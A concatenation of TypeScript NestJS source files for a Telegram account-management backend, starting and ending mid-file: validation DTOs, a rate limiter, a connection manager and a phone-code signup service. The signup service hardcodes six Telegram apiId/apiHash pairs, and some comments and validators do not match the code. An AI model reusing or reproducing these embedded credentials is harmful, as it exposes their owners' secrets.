= 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  @IsEnum(AdminPermission)\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiProperty({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiProperty({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiProperty({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiProperty({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  @IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport enum MessageType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document'\r\n}\r\n\r\nexport class MessageSearchDto {\r\n  @ApiProperty({ description: 'Chat ID to search in' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Text to search for', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  query?: string;\r\n\r\n  @ApiProperty({ description: 'Types of messages to include', enum: MessageType, isArray: true, required: false })\r\n  @IsOptional()\r\n  @IsArray()\r\n  @IsEnum(MessageType, { each: true })\r\n  types?: MessageType[];\r\n\r\n  @ApiProperty({ description: 'Offset for pagination', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Limit for pagination', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  limit?: number = 20;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport class DialogsQueryDto {\r\n    @ApiPropertyOptional({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(1)\r\n    @Max(1000)\r\n    limit: number = 100;\r\n\r\n    @ApiPropertyOptional({ description: 'Dialog offset', required: false, type: Number, minimum: 0 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(0)\r\n    offsetId?: number = 0;\r\n\r\n    @ApiPropertyOptional({ description: 'Include archived chats', required: false, type: Boolean })\r\n    @IsOptional()\r\n    @Transform(({ value }) => {\r\n        if (value === 'true') return true;\r\n        if (value === 'false') return false;\r\n        return value;\r\n    })\r\n    @IsBoolean()\r\n    archived?: boolean = false;\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class UpdateProfileDto {\r\n  @ApiProperty({ description: 'First name' })\r\n  @IsString()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'About/bio information', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n}\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from './batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","export class TelegramError extends Error {\r\n    status: any;\r\n    constructor(\r\n        message: string,\r\n        public readonly code?: string,\r\n        public readonly details?: unknown\r\n    ) {\r\n        super(message);\r\n        this.name = 'TelegramError';\r\n    }\r\n}\r\n\r\nexport enum TelegramErrorCode {\r\n    CLIENT_NOT_FOUND = 'CLIENT_NOT_FOUND',\r\n    CONNECTION_FAILED = 'CONNECTION_FAILED',\r\n    OPERATION_FAILED = 'OPERATION_FAILED',\r\n    INVALID_SESSION = 'INVALID_SESSION',\r\n    FLOOD_WAIT = 'FLOOD_WAIT',\r\n    PHONE_CODE_INVALID = 'PHONE_CODE_INVALID',\r\n    PHONE_CODE_EXPIRED = 'PHONE_CODE_EXPIRED'\r\n}","import { ClientMetadata } from '../types/client-operations';\r\n\r\nexport class ClientMetadataTracker {\r\n    private static instance: ClientMetadataTracker;\r\n    private metadata: Map<string, ClientMetadata> = new Map();\r\n\r\n    private constructor() {}\r\n\r\n    static getInstance(): ClientMetadataTracker {\r\n        if (!ClientMetadataTracker.instance) {\r\n            ClientMetadataTracker.instance = new ClientMetadataTracker();\r\n        }\r\n        return ClientMetadataTracker.instance;\r\n    }\r\n\r\n    initializeClient(mobile: string): void {\r\n        this.metadata.set(mobile, {\r\n            connectedAt: Date.now(),\r\n            lastOperation: '',\r\n            lastOperationTime: 0,\r\n            totalOperations: 0,\r\n            failedOperations: 0,\r\n            reconnectCount: 0\r\n        });\r\n    }\r\n\r\n    recordOperation(mobile: string, operation: string, success: boolean): void {\r\n        const data = this.metadata.get(mobile);\r\n        if (data) {\r\n            data.lastOperation = operation;\r\n            data.lastOperationTime = Date.now();\r\n            data.totalOperations++;\r\n            if (!success) {\r\n                data.failedOperations++;\r\n            }\r\n            this.metadata.set(mobile, data);\r\n        }\r\n    }\r\n\r\n    recordReconnect(mobile: string): void {\r\n        const data = this.metadata.get(mobile);\r\n        if (data) {\r\n            data.reconnectCount++;\r\n            this.metadata.set(mobile, data);\r\n        }\r\n    }\r\n\r\n    getMetadata(mobile: string): ClientMetadata | undefined {\r\n        return this.metadata.get(mobile);\r\n    }\r\n\r\n    getAllMetadata(): Map<string, ClientMetadata> {\r\n        return new Map(this.metadata);\r\n    }\r\n\r\n    removeClient(mobile: string): void {\r\n        this.metadata.delete(mobile);\r\n    }\r\n\r\n    getStatistics(): {\r\n        totalClients: number;\r\n        totalOperations: number;\r\n        failedOperations: number;\r\n        averageReconnects: number;\r\n    } {\r\n        let totalOps = 0;\r\n        let failedOps = 0;\r\n        let totalReconnects = 0;\r\n        const clientCount = this.metadata.size;\r\n\r\n        for (const data of this.metadata.values()) {\r\n            totalOps += data.totalOperations;\r\n            failedOps += data.failedOperations;\r\n            totalReconnects += data.reconnectCount;\r\n        }\r\n\r\n        return {\r\n            totalClients: clientCount,\r\n            totalOperations: totalOps,\r\n            failedOperations: failedOps,\r\n            averageReconnects: clientCount ? totalReconnects / clientCount : 0\r\n        };\r\n    }\r\n}","import { TelegramError, TelegramErrorCode } from '../types/telegram-error';\r\nimport { RateLimiter } from './rate-limiter';\r\nimport TelegramManager from '../TelegramManager';\r\n\r\nexport class ConnectionManager {\r\n    private static instance: ConnectionManager;\r\n    private clientRateLimiter: RateLimiter;\r\n    private operationRateLimiter: RateLimiter;\r\n    private activeConnections: Map<string, { client: TelegramManager; lastUsed: number }>;\r\n\r\n    private constructor() {\r\n        // Rate limit: 5 new connections per minute per mobile\r\n        this.clientRateLimiter = new RateLimiter(60000, 5);\r\n        // Rate limit: 30 operations per minute per client\r\n        this.operationRateLimiter = new RateLimiter(60000, 30);\r\n        this.activeConnections = new Map();\r\n    }\r\n\r\n    static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    async acquireConnection(mobile: string, client: TelegramManager): Promise<void> {\r\n        await this.clientRateLimiter.waitForRateLimit(mobile);\r\n        this.activeConnections.set(mobile, {\r\n            client,\r\n            lastUsed: Date.now()\r\n        });\r\n    }\r\n\r\n    async releaseConnection(mobile: string): Promise<void> {\r\n        const connection = this.activeConnections.get(mobile);\r\n        if (connection) {\r\n            try {\r\n                await connection.client.disconnect();\r\n            } catch (error) {\r\n                console.error(`Error disconnecting client ${mobile}:`, error);\r\n            } finally {\r\n                this.activeConnections.delete(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    async cleanupInactiveConnections(maxIdleTime: number = 180000): Promise<void> {\r\n        const now = Date.now();\r\n        for (const [mobile, connection] of this.activeConnections.entries()) {\r\n            if (now - connection.lastUsed > maxIdleTime) {\r\n                await this.releaseConnection(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    async executeWithRateLimit<T>(mobile: string, operation: () => Promise<T>): Promise<T> {\r\n        await this.operationRateLimiter.waitForRateLimit(mobile);\r\n        try {\r\n            return await operation();\r\n        } catch (error) {\r\n            if (error.message?.includes('FLOOD_WAIT')) {\r\n                throw new TelegramError(\r\n                    'Rate limit exceeded',\r\n                    TelegramErrorCode.FLOOD_WAIT,\r\n                    { waitTime: parseInt(error.message.match(/\\d+/)?.[0] || '0') }\r\n                );\r\n            }\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    updateLastUsed(mobile: string): void {\r\n        const connection = this.activeConnections.get(mobile);\r\n        if (connection) {\r\n            connection.lastUsed = Date.now();\r\n            this.activeConnections.set(mobile, connection);\r\n        }\r\n    }\r\n\r\n    getActiveConnectionCount(): number {\r\n        return this.activeConnections.size;\r\n    }\r\n\r\n    startCleanupInterval(interval: number = 60000): NodeJS.Timer {\r\n        return setInterval(() => this.cleanupInactiveConnections(), interval);\r\n    }\r\n}","export class RateLimiter {\r\n    private timestamps: Map<string, number[]> = new Map();\r\n    private readonly windowMs: number;\r\n    private readonly maxRequests: number;\r\n\r\n    constructor(windowMs: number, maxRequests: number) {\r\n        this.windowMs = windowMs;\r\n        this.maxRequests = maxRequests;\r\n    }\r\n\r\n    async checkRateLimit(key: string): Promise<boolean> {\r\n        const now = Date.now();\r\n        const timestamps = this.timestamps.get(key) || [];\r\n        \r\n        // Remove timestamps outside the window\r\n        const validTimestamps = timestamps.filter(\r\n            timestamp => now - timestamp < this.windowMs\r\n        );\r\n\r\n        if (validTimestamps.length >= this.maxRequests) {\r\n            return false;\r\n        }\r\n\r\n        validTimestamps.push(now);\r\n        this.timestamps.set(key, validTimestamps);\r\n        return true;\r\n    }\r\n\r\n    async waitForRateLimit(key: string): Promise<void> {\r\n        while (!(await this.checkRateLimit(key))) {\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n    }\r\n\r\n    resetLimit(key: string): void {\r\n        this.timestamps.delete(key);\r\n    }\r\n}","import { Logger } from '@nestjs/common';\r\n\r\nexport class TelegramLogger {\r\n    private static instance: TelegramLogger;\r\n    private logger: Logger;\r\n\r\n    private constructor() {\r\n        this.logger = new Logger('TelegramService');\r\n    }\r\n\r\n    static getInstance(): TelegramLogger {\r\n        if (!TelegramLogger.instance) {\r\n            TelegramLogger.instance = new TelegramLogger();\r\n        }\r\n        return TelegramLogger.instance;\r\n    }\r\n\r\n    logOperation(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${operation} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logError(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} failed - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    logWarning(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logDebug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { TgSignupService } from './TgSignup.service';\r\n\r\n@Module({\r\n    imports: [forwardRef(() => UsersModule)],\r\n    controllers: [TgSignupController],\r\n    providers: [TgSignupService],\r\n    exports: [TgSignupService]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\r\nimport { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { UsersService } from \"../users/users.service\";\r\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\r\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\r\nimport { parseError } from \"../../utils/parseError\";\r\n\r\ninterface ITelegramCredentials {\r\n    apiId: number;\r\n    apiHash: string;\r\n}\r\n\r\n@Injectable()\r\nexport class TgSignupService implements OnModuleDestroy {\r\n    private readonly logger = new Logger(TgSignupService.name);\r\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\r\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\r\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\r\n    private readonly cleanupInterval: NodeJS.Timeout;\r\n\r\n    // Map to store active client sessions\r\n    private static readonly activeClients = new Map<string, {\r\n        client: TelegramClient;\r\n        phoneCodeHash: string;\r\n        timeoutId: NodeJS.Timeout;\r\n        createdAt: number;\r\n    }>();\r\n\r\n    // API credentials pool for load balancing with correct hashes\r\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\r\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\r\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\r\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\r\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\r\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\r\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\r\n    ];\r\n\r\n    constructor(private readonly usersService: UsersService) {\r\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\r\n    }\r\n\r\n    async onModuleDestroy() {\r\n        clearInterval(this.cleanupInterval);\r\n        // Cleanup all active sessions\r\n        const phones = Array.from(TgSignupService.activeClients.keys());\r\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\r\n    }\r\n\r\n    private getRandomCredentials(): ITelegramCredentials {\r\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\r\n        return TgSignupService.API_CREDENTIALS[index];\r\n    }\r\n\r\n    private async cleanupStaleSessions() {\r\n        for (const [phone, session] of TgSignupService.activeClients) {\r\n            try {\r\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\r\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\r\n                    (!session.client || !session.client.connected)) {\r\n                    await this.disconnectClient(phone);\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private validatePhoneNumber(phone: string): string {\r\n        // Remove any existing + prefix\r\n        phone = phone.replace(/^\\+/, '');\r\n\r\n        // Validate phone number format\r\n        if (!/^\\d{8,15}$/.test(phone)) {\r\n            throw new BadRequestException('Please enter a valid phone number');\r\n        }\r\n\r\n        return phone;\r\n    }\r\n\r\n    private async disconnectClient(phone: string): Promise<void> {\r\n        const session = TgSignupService.activeClients.get(phone);\r\n        if (session) {\r\n            try {\r\n                clearTimeout(session.timeoutId);\r\n                if (session.client?.connected) {\r\n                    await session.client.disconnect();\r\n                }\r\n                if (session.client) {\r\n                    await session.client.destroy();\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\r\n            } finally {\r\n                TgSignupService.activeClients.delete(phone);\r\n            }\r\n        }\r\n    }\r\n\r\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            // Check if there's an existing active session that can be reused\r\n            const existingSession = TgSignupService.activeClients.get(phone);\r\n            if (existingSession && existingSession.client?.connected) {\r\n                // If session exists and is still valid, disconnect it before creating new one\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            const { apiId, apiHash } = this.getRandomCredentials();\r\n            const session = new StringSession('');\r\n            const client = new TelegramClient(session, apiId, apiHash, {\r\n                connectionRetries: 5,\r\n                retryDelay: 2000,\r\n                useWSS: true,\r\n                timeout: 30000\r\n            });\r\n\r\n            await 